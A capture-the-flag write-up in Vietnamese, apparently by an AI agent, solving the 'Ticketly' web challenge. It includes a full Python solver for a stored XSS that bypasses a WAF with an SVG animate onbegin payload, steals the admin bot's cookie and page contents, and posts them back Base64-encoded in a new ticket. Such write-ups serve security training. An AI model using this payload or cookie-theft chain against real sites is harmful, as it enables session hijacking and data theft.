---
title: "Ticketly"
ctf: "BDSEC"
date: 2026-07-21
category: web
difficulty: medium
points: unknown
flag_format: "bdsec{...}"
author: "Codex"
---

# Ticketly

## Summary

Ticketly là một hệ thống ticket Express cho phép user đăng ký, đăng nhập, tạo ticket và report ticket cho admin review. Lỗi chính là Stored XSS trong phần `body` của ticket: nội dung mô tả được render như HTML thô.

WAF của bài chặn các chữ ký phổ biến như `<script>`, `<img>`, `onerror`, `alert`, `eval`, nhưng payload SVG SMIL dùng `<svg><animate onbegin=...>` vẫn lọt. Khi admin bot mở ticket, JavaScript chạy trong browser admin, đọc được `document.cookie`, sau đó đăng nhập lại tài khoản thường và tạo một ticket mới chứa loot đã Base64 encode.

Flag lấy được từ cookie admin:

```text
bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

## Target

```text
http://45.33.28.244:3000/
```

Các route quan trọng quan sát được:

```text
GET  /register
POST /register        username, password
GET  /login
POST /login           username, password
GET  /tickets
GET  /tickets/new
POST /tickets/new     title, body
GET  /ticket/:id
POST /report/:id
```

Sau khi admin bot mở ticket, trang đang chạy trong context nội bộ:

```text
http://127.0.0.1:3000/admin/ticket/<id>
```

## Vulnerability

Trang xem ticket render `body` trực tiếp bên trong:

```html
<div class="ticket-body">
  ... user-controlled HTML ...
</div>
```

Điều này biến ticket thành Stored XSS. Payload đơn giản kiểu `<script>...</script>` bị WAF chặn, nhưng thẻ SVG `animate` với event `onbegin` không bị block:

```html
<svg><animate attributeName=x begin=0s onbegin='/* JS here */'></animate></svg>
```

Payload cuối làm bốn việc:

1. Chạy trong session admin khi bot mở ticket đã report.
2. Thu thập `location.href`, `document.body.innerText`, `document.cookie`, `localStorage`, và một vài trang cùng origin.
3. Base64 encode loot để tránh WAF/HTML làm hỏng callback.
4. Logout admin, login lại account thường, rồi tạo ticket mới `loot-b64` chứa dữ liệu đã encode.

## Exploit

Script dưới đây là bản rút gọn nhưng đầy đủ: tự tạo account, tạo ticket XSS, report cho admin, poll ticket callback, decode Base64 và in flag.

```python
#!/usr/bin/env python3
import base64
import html
import re
import time
from http.cookiejar import CookieJar
from urllib.parse import quote_plus, urljoin
from urllib.request import HTTPCookieProcessor, Request, build_opener

BASE = "http://45.33.28.244:3000/"
USER = f"solver_{int(time.time())}"
PASS = f"Pass_{int(time.time())}!"

cj = CookieJar()
opener = build_opener(HTTPCookieProcessor(cj))


def req(path, data=None, method=None):
    url = urljoin(BASE, path)
    headers = {"User-Agent": "ticketly-solver"}
    body = None
    if data is not None:
        body = data.encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    r = opener.open(Request(url, data=body, headers=headers, method=method), timeout=15)
    text = r.read().decode("utf-8", "replace")
    return r.geturl(), r.status, dict(r.headers), text


def register_and_login():
    req("/register", f"username={quote_plus(USER)}&password={quote_plus(PASS)}", method="POST")
    req("/login", f"username={quote_plus(USER)}&password={quote_plus(PASS)}", method="POST")


def create_ticket(title, body):
    data = f"title={quote_plus(title)}&body={quote_plus(body)}"
    url, _, headers, text = req("/tickets/new", data, method="POST")
    loc = headers.get("Location", "")
    m = re.search(r"/ticket/(\d+)", loc or url) or re.search(r"/ticket/(\d+)", text)
    if not m:
        raise RuntimeError("ticket creation failed")
    return m.group(1)


def list_tickets():
    _, _, _, text = req("/tickets")
    return re.findall(r"/ticket/(\d+)", text), text


js = f'''
(async()=>{{
 const E=encodeURIComponent,U="{USER}",P="{PASS}";
 let out="URL="+location.href+"\\nTEXT="+document.body.innerText.slice(0,900)+"\\nCK="+document.cookie+"\\nLS="+JSON.stringify(localStorage)+"\\n";
 async function g(u,n){{try{{let r=await fetch(u,{{credentials:"include"}});let t=await r.text();out+="\\n### "+u+" "+r.status+"\\n"+t.slice(0,n);return t}}catch(e){{out+="\\nERR "+u+" "+e}}}}
 let t=await g("/tickets",1200);
 await g("/admin",700);
 let c=0,seen={{}};
 for(let m of t.matchAll(/href=["'](\\/ticket\\/\\d+)["']/g)){{let u=m[1];if(!seen[u]&&c<3){{seen[u]=1;c++;await g(u,700)}}}}
 out=btoa(unescape(encodeURIComponent(out))).slice(0,3600);
 await fetch("/logout",{{credentials:"include"}}).catch(()=>0);
 await fetch("/login",{{method:"POST",credentials:"include",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"username="+E(U)+"&password="+E(P)}});
 await fetch("/tickets/new",{{method:"POST",credentials:"include",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"title="+E("loot-b64")+"&body="+E(out)}});
}})()
'''.strip()

payload = f"<svg><animate attributeName=x begin=0s onbegin='{html.escape(js, quote=True)}'></animate></svg>"

register_and_login()
before, _ = list_tickets()

payload_id = create_ticket("xss-b64-read", payload)
req(f"/report/{payload_id}", "", method="POST")
print(f"reported ticket #{payload_id}")

for _ in range(36):
    time.sleep(5)
    ids, page = list_tickets()
    if "loot-b64" not in page:
        continue

    for tid in ids:
        _, _, _, ticket = req(f"/ticket/{tid}")
        if "loot-b64" not in ticket:
            continue

        b64 = re.search(r'<div class="ticket-body">\s*([A-Za-z0-9+/=]+)\s*</div>', ticket, re.S).group(1)
        loot = base64.b64decode(b64).decode("utf-8", "replace")
        flag = re.search(r"bdsec\{[^}]+\}", loot).group(0)
        print(flag)
        raise SystemExit

raise SystemExit("admin callback did not arrive")
```

## Evidence

Payload thực tế tạo ticket XSS `#5`, report ticket đó cho admin, rồi admin bot tạo lại ticket `#6` với title `loot-b64`.

Loot sau khi decode Base64:

```text
URL=http://127.0.0.1:3000/admin/ticket/5
TEXT=🎫 Ticketly Support Desk
@admin My Tickets New Ticket Logout
[ADMIN] Ticket #5 — xss-b64-read
reviewing

CK=flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
LS={}
```

Điểm quan trọng là cookie `flag=...` của admin không được bảo vệ khỏi JavaScript, nên `document.cookie` trong XSS đọc được trực tiếp.

## Notes

Payload đầu tiên thử ghi raw HTML loot về ticket mới nhưng không tạo được callback ổn định, nhiều khả năng do body callback chứa HTML dài hoặc bị WAF xử lý. Bản thành công encode loot bằng Base64 và giới hạn độ dài bằng `.slice(0,3600)`, vừa tránh phá HTML vừa nằm dưới giới hạn `maxlength="4000"` của form ticket.

Không dùng brute force, wordlist, fuzzing hay web search. Toàn bộ quá trình chỉ gửi request trực tiếp tới instance được cung cấp.

## Flag

```text
bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```
